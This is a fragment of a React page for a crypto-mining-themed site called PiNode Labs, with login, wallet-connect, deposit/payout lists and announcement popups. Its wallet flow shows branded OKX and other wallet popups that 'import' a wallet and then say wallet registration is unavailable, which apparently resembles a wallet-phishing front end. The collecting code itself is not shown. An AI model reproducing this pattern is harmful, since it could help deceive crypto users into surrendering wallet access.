                      className="text-lg sm:text-xl md:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 uppercase tracking-wider"
                      style={{
                        textShadow: "0 0 20px rgba(251, 191, 36, 0.5)"
                      }}
                    >
                      Authorization
                    </h2>
                  </div>

                  {/* Wallet Import Success Message */}
                  {showWalletImportMessage && (
                    <div className="mb-4 p-3 sm:p-4 rounded-lg border-2 border-yellow-400/50 bg-yellow-500/10 backdrop-blur-sm">
                      <div className="flex items-start gap-3">
                        <div className="flex-shrink-0 w-5 h-5 mt-0.5">
                          <svg className="w-5 h-5 text-yellow-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                          </svg>
                        </div>
                        <div className="flex-1">
                          <p className="text-yellow-200 text-xs sm:text-sm leading-relaxed">
                            Currently, the wallet registration feature is not available and is still under development.
                            <br />
                            For the time being, please register using email.
                            <br />
                            Thank you for your understanding.
                          </p>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* Form */}
                  <div className="space-y-3 sm:space-y-4">
                    {/* Email Input */}
                    <div className="group">
                      <label className="flex items-center gap-2 text-yellow-200 mb-1.5 sm:mb-2 font-semibold text-xs sm:text-sm">
                        <img 
                          src="/user.png" 
                          alt="User" 
                          className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" 
                          style={{ 
                            imageRendering: "crisp-edges" as const
                          }} 
                        />
                        <span>Login or email</span>
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          value={email}
                          onChange={(e) => setEmail(e.target.value)}
                          placeholder="Enter your email"
                          className="w-full px-3 sm:px-4 py-2 sm:py-2.5 rounded-lg bg-black/60 border-2 border-amber-700/50 text-white placeholder-gray-400 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/30 backdrop-blur-sm transition-all duration-300 text-xs sm:text-sm"
                          style={{
                            boxShadow: "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 0 0 rgba(251, 191, 36, 0)"
                          }}
                          onFocus={(e) => {
                            e.target.style.boxShadow = "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 15px rgba(251, 191, 36, 0.3)"
                          }}
                          onBlur={(e) => {
                            e.target.style.boxShadow = "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 0 0 rgba(251, 191, 36, 0)"
                          }}
                        />
                      </div>
                    </div>

                    {/* Password Input */}
                    <div className="group">
                      <label className="flex items-center gap-2 text-yellow-200 mb-1.5 sm:mb-2 font-semibold text-xs sm:text-sm">
                        <img 
                          src="/pass.png" 
                          alt="Password" 
                          className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" 
                          style={{ 
                            imageRendering: "crisp-edges" as const
                          }} 
                        />
                        <span>Password</span>
                      </label>
                      <div className="relative">
                        <input
                          type="password"
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          placeholder="Enter your password"
                          className="w-full px-3 sm:px-4 py-2 sm:py-2.5 rounded-lg bg-black/60 border-2 border-amber-700/50 text-white placeholder-gray-400 focus:outline-none focus:border-yellow-400 focus:ring-2 focus:ring-yellow-400/30 backdrop-blur-sm transition-all duration-300 text-xs sm:text-sm"
                          style={{
                            boxShadow: "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 0 0 rgba(251, 191, 36, 0)"
                          }}
                          onFocus={(e) => {
                            e.target.style.boxShadow = "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 15px rgba(251, 191, 36, 0.3)"
                          }}
                          onBlur={(e) => {
                            e.target.style.boxShadow = "inset 0 2px 4px rgba(0, 0, 0, 0.3), 0 0 0 0 rgba(251, 191, 36, 0)"
                          }}
                        />
                      </div>
                    </div>

                    {/* Forgot Password */}
                    <div className="text-right">
                      <a 
                        href="#" 
                        className="text-yellow-300 text-[10px] sm:text-xs hover:text-yellow-200 underline transition-colors duration-200"
                      >
                        Forgot your password?
                      </a>
                    </div>

                    {/* Action Buttons */}
                    <div className="flex gap-2 sm:gap-3">
                      <Button
                        onClick={handleLoginClick}
                        className="flex-1 bg-gradient-to-r from-yellow-500 via-orange-500 to-yellow-500 hover:from-yellow-600 hover:via-orange-600 hover:to-yellow-600 text-white font-bold py-2 sm:py-2.5 rounded-lg shadow-lg text-xs sm:text-sm transition-all duration-300"
                        style={{
                          backgroundSize: "200% 100%",
                          boxShadow: "0 4px 15px rgba(251, 191, 36, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2)"
                        }}
                      >
                        Log in
                      </Button>
                      <Button
                        onClick={handleSignUpClick}
                        variant="outline"
                        className="flex-1 bg-transparent border-2 border-yellow-500 text-yellow-500 hover:bg-yellow-500 hover:text-white font-bold py-2 sm:py-2.5 rounded-lg shadow-lg text-xs sm:text-sm transition-all duration-300"
                        style={{
                          boxShadow: "0 4px 15px rgba(251, 191, 36, 0.2)"
                        }}
                      >
                        Sign Up
                      </Button>
                    </div>

                    {/* Divider */}
                    <div className="relative my-4">
                      <div className="absolute inset-0 flex items-center">
                        <div className="w-full border-t border-yellow-500/30"></div>
                      </div>
                      <div className="relative flex justify-center text-xs uppercase">
                        <span className="text-yellow-300/70">Or</span>
                      </div>
                    </div>

                    {/* Connect Wallet Button */}
                    <div className="relative group">
                      <Button
                        onClick={handleConnectWallet}
                        className="w-full bg-gradient-to-r from-yellow-500 via-orange-500 to-yellow-500 hover:from-yellow-600 hover:via-orange-600 hover:to-yellow-600 text-white font-bold py-2.5 sm:py-3 rounded-lg shadow-lg text-xs sm:text-sm transition-all duration-300 transform hover:scale-105 relative overflow-hidden"
                        style={{
                          backgroundSize: "200% 100%",
                          boxShadow: "0 4px 20px rgba(251, 191, 36, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 0 20px rgba(251, 191, 36, 0.2)"
                        }}
                      >
                        {/* Shimmer effect */}
                        <div 
                          className="absolute inset-0 opacity-30"
                          style={{
                            background: "linear-gradient(110deg, transparent 40%, rgba(255, 255, 255, 0.3) 50%, transparent 60%)",
                            backgroundSize: "200% 100%",
                            animation: "shimmer 3s infinite"
                          }}
                        />
                        <div className="relative z-10 flex items-center justify-center gap-2.5">
                          <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-white/20 p-1 flex items-center justify-center">
                            <img 
                              src="/wallet.png" 
                              alt="Wallet" 
                              className="w-full h-full object-contain" 
                              style={{ imageRendering: "crisp-edges" }}
                            />
                          </div>
                          <span className="drop-shadow-[0_2px_4px_rgba(0,0,0,0.3)]">Connect Wallet</span>
                          <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6" />
                          </svg>
                        </div>
                      </Button>
                    </div>
                    <p className="text-yellow-200/60 text-xs text-center mt-2">
                      Supported: MetaMask, OKX, Phantom, Bitget, Rabby, Trust Wallet
                    </p>
                  </div>
                </div>
              </div>
            </div>

            {/* Right: Miner Character */}
            <div className="order-1 lg:order-2 flex justify-center lg:justify-end items-start">
              <div className="relative w-full max-w-xs sm:max-w-sm lg:max-w-md xl:max-w-lg">
                {/* Glowing Background Effect */}
                <div className="absolute inset-0 flex items-center justify-center">
                  <div 
                    className="w-64 h-64 sm:w-80 sm:h-80 lg:w-96 lg:h-96 rounded-full blur-3xl opacity-30 animate-pulse"
                    style={{
                      background: "radial-gradient(circle, rgba(251, 191, 36, 0.4) 0%, rgba(234, 88, 12, 0.2) 50%, transparent 100%)"
                    }}
                  />
                </div>
                
                {/* Miner Image Container */}
                <div className="relative z-10 transform hover:scale-105 transition-transform duration-500">
                  <div 
                    className="absolute -inset-4 rounded-full blur-xl opacity-50"
                    style={{
                      background: "radial-gradient(circle, rgba(251, 191, 36, 0.3) 0%, transparent 70%)"
                    }}
                  />
                  <img
                    src="/miner4.png"
                    alt="Miner"
                    className="relative w-full h-auto object-contain drop-shadow-2xl"
                    style={{ 
                      filter: "drop-shadow(0 20px 60px rgba(251, 191, 36, 0.4))",
                      imageRendering: "crisp-edges" as const
                    }}
                    loading="eager"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Game Actions / Affiliate removed per request */}

        {/* Last Deposits & Payouts */}
        <div className="container mx-auto px-3 sm:px-4 mb-8 sm:mb-12">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-6">
            {/* Deposits */}
            <div 
              className="group relative rounded-2xl p-6 sm:p-8 overflow-hidden transition-all duration-300"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-20 h-20 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-20 h-20 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              {/* Content */}
              <div className="relative z-10">
                <h3 
                  className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 uppercase mb-5 sm:mb-6"
                  style={{
                    textShadow: "0 0 20px rgba(251, 191, 36, 0.5)"
                  }}
                >
                  Last 20 Deposits
                </h3>
                
                <div className="space-y-2 max-h-64 sm:max-h-80 overflow-y-auto custom-scrollbar">
                  {deposits.length === 0 ? (
                    <div className="text-center py-4 text-yellow-200/60 text-sm">No deposits yet</div>
                  ) : (
                    deposits.map((deposit, i) => (
                      <div 
                        key={i} 
                        className="group/item flex items-center justify-between p-3 rounded-lg transition-all duration-200 hover:bg-black/40"
                        style={{
                          background: "rgba(0, 0, 0, 0.3)",
                          border: "1px solid rgba(251, 191, 36, 0.2)"
                        }}
                      >
                        <div className="flex items-center gap-3 min-w-0 flex-1">
                          <img 
                            src="/user.png" 
                            alt="User" 
                            className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" 
                            style={{ imageRendering: "crisp-edges" }} 
                          />
                          <span className="text-yellow-200 text-sm sm:text-base truncate font-medium">
                            {deposit.name}
                          </span>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0">
                          <img 
                            src={getChainIcon(deposit.network)} 
                            alt={deposit.network || "USDT"} 
                            className="w-4 h-4 sm:w-5 sm:h-5" 
                            style={{ imageRendering: "crisp-edges" }}
                            onError={(e) => {
                              const target = e.target as HTMLImageElement
                              target.src = "/deposit/usdt_bep20.svg"
                            }}
                          />
                          <span className="text-yellow-300 font-bold text-sm sm:text-base">
                            ${deposit.amount.toFixed(2)}
                          </span>
                        </div>
                      </div>
                    ))
                  )}
                </div>
                
                {/* Bottom Accent Line */}
                <div className="mt-4 h-0.5 bg-gradient-to-r from-transparent via-yellow-500/50 to-transparent rounded-full"></div>
              </div>
            </div>

            {/* Payouts */}
            <div 
              className="group relative rounded-2xl p-6 sm:p-8 overflow-hidden transition-all duration-300"
              style={{
                background: "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(30, 41, 59, 0.95) 50%, rgba(15, 23, 42, 0.95) 100%)",
                border: "2px solid rgba(251, 191, 36, 0.4)",
                boxShadow: "0 15px 50px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(251, 191, 36, 0.2), 0 0 40px rgba(251, 191, 36, 0.1)"
              }}
            >
              {/* Mining Pattern Background */}
              <div 
                className="absolute inset-0 opacity-20"
                style={{
                  backgroundImage: `
                    repeating-linear-gradient(45deg, transparent, transparent 8px, rgba(251, 191, 36, 0.1) 8px, rgba(251, 191, 36, 0.1) 16px),
                    repeating-linear-gradient(-45deg, transparent, transparent 8px, rgba(234, 88, 12, 0.1) 8px, rgba(234, 88, 12, 0.1) 16px)
                  `,
                  backgroundSize: "32px 32px"
                }}
              />
              
              {/* Glowing Corner Effects */}
              <div 
                className="absolute top-0 left-0 w-20 h-20 bg-gradient-to-br from-yellow-500/20 to-transparent rounded-br-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              <div 
                className="absolute bottom-0 right-0 w-20 h-20 bg-gradient-to-tl from-orange-500/20 to-transparent rounded-tl-full opacity-0 group-hover:opacity-100 transition-opacity duration-300"
              />
              
              {/* Animated Border Glow */}
              <div 
                className="absolute inset-0 rounded-2xl opacity-0 group-hover:opacity-100 transition-opacity duration-300"
                style={{
                  background: "linear-gradient(135deg, rgba(251, 191, 36, 0.15) 0%, rgba(234, 88, 12, 0.15) 100%)",
                  boxShadow: "inset 0 0 30px rgba(251, 191, 36, 0.2)"
                }}
              />
              
              {/* Content */}
              <div className="relative z-10">
                <h3 
                  className="text-xl sm:text-2xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-orange-300 to-yellow-300 uppercase mb-5 sm:mb-6"
                  style={{
                    textShadow: "0 0 20px rgba(251, 191, 36, 0.5)"
                  }}
                >
                  Last 20 Payouts
                </h3>
                
                <div className="space-y-2 max-h-64 sm:max-h-80 overflow-y-auto custom-scrollbar">
                  {payouts.length === 0 ? (
                    <div className="text-center py-4 text-yellow-200/60 text-sm">No payouts yet</div>
                  ) : (
                    payouts.map((payout, i) => (
                      <div 
                        key={i} 
                        className="group/item flex items-center justify-between p-3 rounded-lg transition-all duration-200 hover:bg-black/40"
                        style={{
                          background: "rgba(0, 0, 0, 0.3)",
                          border: "1px solid rgba(251, 191, 36, 0.2)"
                        }}
                      >
                        <div className="flex items-center gap-3 min-w-0 flex-1">
                          <img 
                            src="/user.png" 
                            alt="User" 
                            className="w-4 h-4 sm:w-5 sm:h-5 flex-shrink-0" 
                            style={{ imageRendering: "crisp-edges" }} 
                          />
                          <span className="text-yellow-200 text-sm sm:text-base truncate font-medium">
                            {payout.name}
                          </span>
                        </div>
                        <div className="flex items-center gap-2 flex-shrink-0">
                          <img 
                            src={getChainIcon(payout.network)} 
                            alt={payout.network || "USDT"} 
                            className="w-4 h-4 sm:w-5 sm:h-5" 
                            style={{ imageRendering: "crisp-edges" }}
                            onError={(e) => {
                              const target = e.target as HTMLImageElement
                              target.src = "/deposit/usdt_bep20.svg"
                            }}
                          />
                          <span className="text-yellow-300 font-bold text-sm sm:text-base">
                            ${payout.amount.toFixed(2)}
                          </span>
                        </div>
                      </div>
                    ))
                  )}
                </div>
                
                {/* Bottom Accent Line */}
                <div className="mt-4 h-0.5 bg-gradient-to-r from-transparent via-yellow-500/50 to-transparent rounded-full"></div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="container mx-auto px-3 sm:px-4 py-6 sm:py-8">
          <div 
            className="rounded-xl p-6 sm:p-8 text-center backdrop-blur-sm bg-black/20 border border-yellow-500/20"
            style={{
              boxShadow: "0 8px 32px rgba(0, 0, 0, 0.3), inset 0 1px 0 rgba(251, 191, 36, 0.1)"
            }}
          >
            <div className="flex items-center justify-center gap-2 mb-3">
              <img 
                src="/pi/pinetwork.png" 
                alt="PiNode Labs Logo" 
                className="h-16 sm:h-20 md:h-24 object-contain"
                style={{ imageRendering: "crisp-edges" }}
              />
            </div>
            <p className="text-yellow-300/60 text-xs sm:text-sm">
              © 2026 PiNode Labs. All rights reserved.
            </p>
          </div>
        </footer>
      </div>

      {/* Wallet Connect Modal */}
      <WalletConnectModal
        open={showWalletModal}
        onOpenChange={setShowWalletModal}
        onWalletConnect={handleWalletConnect}
      />

      {/* OKX Wallet Popup */}
      {!hasImportedWallet && (
        <OKXWalletPopup 
          open={showOKXPopup} 
          onClose={handleWalletImportSuccess}
        />
      )}

      {/* Other Wallet Popups */}
      {!hasImportedWallet && selectedWallet && selectedWallet !== "okx" && (
        <WalletPopup
          open={!!selectedWallet}
          walletName={selectedWallet}
          walletId={selectedWallet}
          onClose={handleWalletImportSuccess}
        />
      )}

      {/* Traffic Down Announcement Popup */}
      <Dialog open={showTrafficDownPopup} onOpenChange={setShowTrafficDownPopup}>
        <DialogContent 
          className="max-w-[98vw] sm:max-w-[95vw] md:max-w-md lg:max-w-lg xl:max-w-xl border-0 bg-transparent p-0 sm:p-1 md:p-2 overflow-visible shadow-none mx-1 sm:mx-2 md:mx-4"
          showCloseButton={false}
          onInteractOutside={(e) => {
            e.preventDefault()
          }}
          onEscapeKeyDown={(e) => {
            e.preventDefault()
          }}
        >
          {/* Hidden DialogTitle for accessibility */}
          <DialogHeader className="sr-only">
            <DialogTitle>Traffic Down Announcement</DialogTitle>
          </DialogHeader>
          
          <div className="relative w-full">
            <div 
              className="relative rounded-xl sm:rounded-2xl md:rounded-3xl overflow-hidden w-full"
              style={{
                background: "transparent"
              }}
            >
              {/* Close Button - Responsive */}
              <button
                onClick={() => setShowTrafficDownPopup(false)}
                className="absolute top-1 right-1 sm:top-2 sm:right-2 md:top-3 md:right-3 lg:top-4 lg:right-4 w-7 h-7 sm:w-8 sm:h-8 md:w-9 md:h-9 lg:w-10 lg:h-10 rounded-full bg-black/60 hover:bg-black/80 active:bg-black/90 border-2 border-white/40 flex items-center justify-center z-20 touch-manipulation"
                style={{
                  transition: "background-color 0.2s ease"
                }}
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6 text-white" />
              </button>

              {/* Popup Image - HD Quality, No Animation, Responsive, Preloaded */}
              <img 
                src="/gamety dashboard/traffict.png" 
                alt="Traffic Down Announcement" 
                className="w-full h-auto object-contain rounded-xl sm:rounded-2xl md:rounded-3xl block"
                style={{ 
                  imageRendering: "auto" as const,
                  maxWidth: "100%",
                  height: "auto",
                  display: "block",
                  animation: "none",
                  transition: "none",
                  transform: "none",
                  willChange: "auto",
                  WebkitFontSmoothing: "antialiased" as any,
                  MozOsxFontSmoothing: "grayscale" as any,
                  backfaceVisibility: "hidden" as const,
                  filter: "none",
                  opacity: 1,
                  objectFit: "contain" as const,
                  objectPosition: "center" as const
                }}
                loading="eager"
                decoding="async"
                fetchPriority="high"
              />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Refban Announcement Popup */}
      <Dialog open={showRefbanPopup} onOpenChange={setShowRefbanPopup}>
        <DialogContent 
          className="max-w-[98vw] sm:max-w-[95vw] md:max-w-md lg:max-w-lg xl:max-w-xl border-0 bg-transparent p-0 sm:p-1 md:p-2 overflow-visible shadow-none mx-1 sm:mx-2 md:mx-4"
          showCloseButton={false}
          onInteractOutside={(e) => {
            e.preventDefault()
          }}
          onEscapeKeyDown={(e) => {
            e.preventDefault()
          }}
        >
          {/* Hidden DialogTitle for accessibility */}
          <DialogHeader className="sr-only">
            <DialogTitle>Refban Announcement</DialogTitle>
          </DialogHeader>
          
          <div className="relative w-full">
            <div 
              className="relative rounded-xl sm:rounded-2xl md:rounded-3xl overflow-hidden w-full"
              style={{
                background: "transparent"
              }}
            >
              {/* Close Button - Responsive */}
              <button
                onClick={() => setShowRefbanPopup(false)}
                className="absolute top-1 right-1 sm:top-2 sm:right-2 md:top-3 md:right-3 lg:top-4 lg:right-4 w-7 h-7 sm:w-8 sm:h-8 md:w-9 md:h-9 lg:w-10 lg:h-10 rounded-full bg-black/60 hover:bg-black/80 active:bg-black/90 border-2 border-white/40 flex items-center justify-center z-20 touch-manipulation"
                style={{
                  transition: "background-color 0.2s ease"
                }}
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6 text-white" />
              </button>

              {/* Popup Image - HD Quality, No Animation, Responsive, Preloaded */}
              <img 
                src="/gamety dashboard/refban.png" 
                alt="Refban Announcement" 
                className="w-full h-auto object-contain rounded-xl sm:rounded-2xl md:rounded-3xl block"
                style={{ 
                  imageRendering: "auto" as const,
                  maxWidth: "100%",
                  height: "auto",
                  display: "block",
                  animation: "none",
                  transition: "none",
                  transform: "none",
                  willChange: "auto",
                  WebkitFontSmoothing: "antialiased" as any,
                  MozOsxFontSmoothing: "grayscale" as any,
                  backfaceVisibility: "hidden" as const,
                  filter: "none",
                  opacity: 1,
                  objectFit: "contain" as const,
                  objectPosition: "center" as const
                }}
                loading="eager"
                decoding="async"
                fetchPriority="high"
              />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Dev Announcement Popup */}
      <Dialog open={showDevPopup} onOpenChange={setShowDevPopup}>
        <DialogContent 
          className="max-w-[98vw] sm:max-w-[95vw] md:max-w-md lg:max-w-lg xl:max-w-xl border-0 bg-transparent p-0 sm:p-1 md:p-2 overflow-visible shadow-none mx-1 sm:mx-2 md:mx-4"
          showCloseButton={false}
          onInteractOutside={(e) => {
            e.preventDefault()
          }}
          onEscapeKeyDown={(e) => {
            e.preventDefault()
          }}
        >
          {/* Hidden DialogTitle for accessibility */}
          <DialogHeader className="sr-only">
            <DialogTitle>Dev Announcement</DialogTitle>
          </DialogHeader>
          
          <div className="relative w-full">
            <div 
              className="relative rounded-xl sm:rounded-2xl md:rounded-3xl overflow-hidden w-full"
              style={{
                background: "transparent"
              }}
            >
              {/* Close Button - Responsive */}
              <button
                onClick={() => setShowDevPopup(false)}
                className="absolute top-1 right-1 sm:top-2 sm:right-2 md:top-3 md:right-3 lg:top-4 lg:right-4 w-7 h-7 sm:w-8 sm:h-8 md:w-9 md:h-9 lg:w-10 lg:h-10 rounded-full bg-black/60 hover:bg-black/80 active:bg-black/90 border-2 border-white/40 flex items-center justify-center z-20 touch-manipulation"
                style={{
                  transition: "background-color 0.2s ease"
                }}
              >
                <X className="w-4 h-4 sm:w-5 sm:h-5 md:w-6 md:h-6 text-white" />
              </button>

              {/* Popup Image - HD Quality, No Animation, Responsive, Preloaded */}
              <img 
                src="/gamety dashboard/dev.png" 
                alt="Dev Announcement" 
                className="w-full h-auto object-contain rounded-xl sm:rounded-2xl md:rounded-3xl block"
                style={{ 
                  imageRendering: "auto" as const,
                  maxWidth: "100%",
                  height: "auto",
                  display: "block",
                  animation: "none",
                  transition: "none",
                  transform: "none",
                  willChange: "auto",
                  WebkitFontSmoothing: "antialiased" as any,
                  MozOsxFontSmoothing: "grayscale" as any,
                  backfaceVisibility: "hidden" as const,
                  filter: "none",
                  opacity: 1,
                  objectFit: "contain" as const,
                  objectPosition: "center" as const
                }}
                loading="eager"
                decoding="async"
                fetchPriority="high"
              />
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
